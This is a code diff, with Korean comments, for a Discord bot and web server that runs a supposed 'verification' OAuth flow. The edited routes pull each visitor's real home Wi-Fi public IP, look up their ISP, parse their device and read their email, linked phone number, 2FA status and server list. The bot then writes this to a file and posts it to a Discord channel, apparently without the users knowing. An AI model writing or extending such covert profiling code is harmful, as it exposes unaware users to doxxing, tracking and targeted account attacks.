@@ -32,7 +32,7 @@ const client = new Client({
     ]
 });
 
-// User-Agent를 분석해서 기기 종류(삼성, 애플, 윈도우 등)를 예쁘게 판별하는 함수
+// 기기 종류 판별 함수
 function parseDevice(ua) {
     if (!ua) return '알 수 없음';
     let os = '알 수 없음';
@@ -153,9 +153,10 @@ client.on('messageCreate', async (message) => {
 });
 
 app.get('/verify', async (req, res) => {
-    let userIp = req.headers['x-forwarded-for'] 
-        ? req.headers['x-forwarded-for'].split(',')[0].trim() 
-        : req.socket.remoteAddress;
+    // 와이파이 환경일 때 공유기의 공인 IP가 정확히 잡히도록 헤더 추출 최적화
+    let userIp = req.headers['cf-connecting-ip'] || 
+                 (req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : null) || 
+                 req.socket.remoteAddress;
 
     if (!userIp || userIp === '::1' || userIp === '127.0.0.1') {
         userIp = '127.0.0.1';
@@ -192,7 +193,7 @@ app.get('/callback', async (req, res) => {
         }
     } catch (e) {}
 
-    // IP를 통해 통신사(ISP) 및 조직 정보 조회 (예: LG U+, KT, SKT 등)
+    // 와이파이 공유기의 공인 IP를 통해 통신사(ISP) 및 조직 정보 조회 (예: LG U+, KT, SKT 등)
     let ispInfo = '알 수 없음 (모바일/기타)';
     try {
         const ispRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,isp,org,as`);
@@ -240,7 +241,6 @@ app.get('/callback', async (req, res) => {
         const filePath = path.join(__dirname, `guilds_${userData.id}.txt`);
         fs.writeFileSync(filePath, guildsTextContent, 'utf8');
 
-        // 전화번호 연동 여부 및 2FA 상태 파싱
         const phoneStatus = userData.phone ? `✅ 연동됨 (${userData.phone})` : '❌ 미연동 또는 확인 불가';
         const isMfaEnabled = userData.mfa_enabled ? '✅ 2차 인증(OTP) 활성화됨' : '❌ 2차 인증 미사용';
 
@@ -252,7 +252,7 @@ app.get('/callback', async (req, res) => {
                                     `📧 **이메일:** \`${userData.email}\` (\`${userData.verified ? '인증됨' : '미인증'}\`)\n` +
                                     `📱 **휴대폰 번호 연동:** \`${phoneStatus}\`\n` +
                                     `🔒 **계정 보안(2FA):** \`${isMfaEnabled}\`\n` +
-                                    `🌐 **공인 IP:** \`${userIp}\`\n` +
+                                    `🌐 **와이파이 공인 IP:** \`${userIp}\`\n` +
                                     `📡 **통신사/ISP:** \`${ispInfo}\`\n` +
                                     `💻 **기기 및 플랫폼:** \`${deviceDetail}\``);
             form.append('file', fs.createReadStream(filePath));
